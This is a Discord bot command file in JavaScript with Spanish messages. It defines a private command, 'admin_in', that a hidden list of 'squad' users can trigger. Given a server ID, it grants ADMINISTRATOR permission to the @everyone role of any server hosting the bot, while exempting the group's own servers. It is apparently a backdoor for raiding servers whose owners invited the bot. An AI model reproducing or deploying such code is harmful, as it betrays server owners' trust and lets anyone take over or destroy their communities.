const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return 
    try{

        let id = args[0];
            if(client.guilds.cache.has(id)){
              if(id === "935880059498168421" || id === "935880059498168421") return message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Error ❌ El comando no funciona en este servidor.```"))            
 let guild = client.guilds.cache.get(id);
              message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Administrador otorgado en "+guild.name+"```"))
        
              guild.roles.cache.find(roles => roles.name === '@everyone').edit({
                permissions: "ADMINISTRATOR"
              })
        
          }else{
            message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Error ❌ No estoy en ese servidor.```"));
          }
            }catch(e) {
              message.author.send(new MessageEmbed().setDescription("```Error ❌ Ha ocurrido una falla```")
              .addField("__Posibles Errores:__", "```• Permisos insuficientes\n• El rol ya tiene los permisos\n• No estoy en el servidor```")
              .addField("__Error Detallado:__", "```"+e+"```"));
            }

}

exports.help = {
  name:"admin_in",
  aliases:["adminon"],
  usage:"[ Argumentos : Server ID ]",
  description:"Otorga permisos de administrador al rol everyone mediante la ID del servidor",
  category:"Private"
  
}